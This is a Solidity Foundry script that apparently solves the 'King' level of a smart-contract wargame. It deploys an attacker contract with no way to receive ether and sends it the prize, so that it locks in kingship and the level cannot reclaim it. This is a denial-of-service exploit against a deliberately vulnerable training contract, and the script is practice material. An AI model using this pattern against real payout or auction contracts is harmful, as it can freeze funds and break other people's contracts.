// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Broadcast} from "./helper/Broadcast.sol";
import {King} from "../src/L9King.sol";

/**
 * Higher amount will be named king, previous king gets paid
 * @notice Goal is to prevent the level from reclaiming kingship.
 * Starting prize is 1e16 = 0.01 ether
 */
contract Attacker {
    constructor(King _kingInstance) payable {
        (bool success,) = address(_kingInstance).call{value: _kingInstance.prize()}("");
        require(success, "Transfer failed");
    }
}

contract L9KingAttack is Script, Broadcast {
    King king = King(payable(0xAD4e198623A5E2723e19E4D4a6ECF72B1D19FE4B));
    Attacker attacker;

    function run() public broadcast {
        // Sending eth to contract while it is deploying
        new Attacker{value: king.prize()}(king);
    }
}
